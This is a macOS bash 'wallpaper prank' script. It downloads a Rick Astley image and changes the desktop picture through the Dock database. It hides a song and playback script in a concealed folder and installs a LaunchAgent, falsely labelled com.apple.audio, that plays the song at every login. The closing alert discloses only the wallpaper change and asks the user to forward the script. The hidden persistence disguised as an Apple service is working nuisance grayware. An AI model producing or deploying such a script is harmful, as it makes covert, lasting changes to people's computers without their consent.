#!/bin/bash

# Make some directories
mkdir $HOME/Library/Containers/
mkdir $HOME/Library/Containers/.succmytoes

# Download image and move it into the hidden directory
curl -O https://img02.deviantart.net/3eba/i/2009/227/6/6/never_gonna_give_you_up_by_lightfantastic.jpg
mv never_gonna_give_you_up_by_lightfantastic.jpg $HOME/Library/Containers/.succmytoes/x.png

# Set desktop picture
sqlite3 /$HOME/Library/Application\ Support/Dock/desktoppicture.db "update data set value = '$HOME/Library/Containers/.succmytoes/x.png'" && killall Dock

# Copy song and script to play the song into the hidden directory
cp hit.mp3 $HOME/Library/Containers/.succmytoes
cp song.sh $HOME/Library/Containers/.succmytoes

# Make the song script executable
chmod +x $HOME/Library/Containers/.succmytoes/song.sh

#Create directory and LaunchAgents
mkdir $HOME/Library/LaunchAgents

#Write the .plist to LaunchAgents
echo '
<plist version="1.0">
    <dict>
    <key>Label</key>
        <string>com.apple.audio</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>'$HOME'/Library/Containers/.succmytoes/song.sh</string>
    </array>
    <key>RunAtLoad</key>
        <true/>
    <key>AbandonProcessGroup</key>
        <true/>
    </dict>
</plist>
' > $HOME/Library/LaunchAgents/com.apple.audio.plist

#Load the LaunchAgent
launchctl load $HOME/Library/LaunchAgents/com.apple.audio.plist

# Alert the user to the wallpaper change
osascript << EOF
tell application "System Events" 
display alert "This is a wallpaper prank! Send it to your friends!" buttons {"Sounds good."}
end tell
EOF
